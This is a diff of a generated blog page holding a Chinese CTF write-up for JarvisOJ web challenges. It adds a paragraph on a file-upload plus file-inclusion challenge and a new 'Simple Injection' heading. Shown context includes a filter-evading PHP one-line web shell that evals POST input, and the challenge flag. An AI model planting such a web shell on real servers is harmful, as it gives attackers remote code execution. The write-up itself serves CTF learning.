@@ -106,7 +106,7 @@
 <meta property="og:image" content="https://i.loli.net/2018/02/15/5a85395057c9c.jpg">
 <meta property="og:image" content="https://i.loli.net/2018/02/15/5a853954bc174.jpg">
 <meta property="og:image" content="https://i.loli.net/2018/02/15/5a853954bc16d.jpg">
-<meta property="og:updated_time" content="2018-02-15T07:44:21.756Z">
+<meta property="og:updated_time" content="2018-02-15T08:34:22.987Z">
 <meta name="twitter:card" content="summary">
 <meta name="twitter:title" content="JarvisOJ Writeup">
 <meta name="twitter:description" content="写在最前前天做了MOCTF，有些遗憾，本来能做出来的题却没能做出来(嚎啕大哭)，这次的失误也是因为以前自己做过的题并没有好好总结复习导致的，所以决定重新把之前做过的CTF题翻出来重新做一遍，重新学习吧！由于难度问题，JarvisOJ上的题我还没有完全全部做完，这里先贴出我已经做出来的题目。JarvisOJ：https://www.jarvisoj.com PORT 51根据提示，这里要使用vps上">
@@ -409,7 +409,8 @@
 <p>但是这里却出问题了，页面上提示说：You should not do this!这里应该是一句话木马里的相关参数被过滤掉了，所以要重新修改一句话木马。</p>
 <figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">script</span> <span class="attr">language</span>=<span class="string">"phP"</span>&gt;</span><span class="javascript">@<span class="built_in">eval</span>($_POST[<span class="string">'w'</span>]);</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br></pre></td></tr></table></figure>
 <p>重新上传，重复上述步骤，最后就能获得flag。<br><img src="https://i.loli.net/2018/02/15/5a853954bc16d.jpg" alt=""><br>flag:CTF{upl0ad_sh0uld_n07_b3_a110wed}</p>
-
+<p>拿到flag以后我又做了一个测试，我上传了一张干净的图片，也是用上面的访问方法再%00截断，但是什么都没有，所以这题就是文件上传+文件包含的题目了，如果上传的文件里的一句话木马被成功解析并且被访问到，就能获取flag。</p>
+<h3 id="Simple-Injection"><a href="#Simple-Injection" class="headerlink" title="Simple Injection"></a>Simple Injection</h3>
       
     </div>
     
@@ -583,7 +584,7 @@
             
 
             
-              <div class="post-toc-content"><ol class="nav"><li class="nav-item nav-level-3"><a class="nav-link" href="#写在最前"><span class="nav-number">1.</span> <span class="nav-text">写在最前</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#PORT-51"><span class="nav-number">2.</span> <span class="nav-text">PORT 51</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#LOCALHOST"><span class="nav-number">3.</span> <span class="nav-text">LOCALHOST</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#Login"><span class="nav-number">4.</span> <span class="nav-text">Login</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#神盾局的秘密"><span class="nav-number">5.</span> <span class="nav-text">神盾局的秘密</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#IN-A-mess"><span class="nav-number">6.</span> <span class="nav-text">IN A mess</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#RE"><span class="nav-number">7.</span> <span class="nav-text">RE?</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#flag在管理员手里"><span class="nav-number">8.</span> <span class="nav-text">flag在管理员手里</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#Chopper"><span class="nav-number">9.</span> <span class="nav-text">Chopper</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#Easy-Gallery"><span class="nav-number">10.</span> <span class="nav-text">Easy Gallery</span></a></li></ol></div>
+              <div class="post-toc-content"><ol class="nav"><li class="nav-item nav-level-3"><a class="nav-link" href="#写在最前"><span class="nav-number">1.</span> <span class="nav-text">写在最前</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#PORT-51"><span class="nav-number">2.</span> <span class="nav-text">PORT 51</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#LOCALHOST"><span class="nav-number">3.</span> <span class="nav-text">LOCALHOST</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#Login"><span class="nav-number">4.</span> <span class="nav-text">Login</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#神盾局的秘密"><span class="nav-number">5.</span> <span class="nav-text">神盾局的秘密</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#IN-A-mess"><span class="nav-number">6.</span> <span class="nav-text">IN A mess</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#RE"><span class="nav-number">7.</span> <span class="nav-text">RE?</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#flag在管理员手里"><span class="nav-number">8.</span> <span class="nav-text">flag在管理员手里</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#Chopper"><span class="nav-number">9.</span> <span class="nav-text">Chopper</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#Easy-Gallery"><span class="nav-number">10.</span> <span class="nav-text">Easy Gallery</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#Simple-Injection"><span class="nav-number">11.</span> <span class="nav-text">Simple Injection</span></a></li></ol></div>
             
 
           </div>
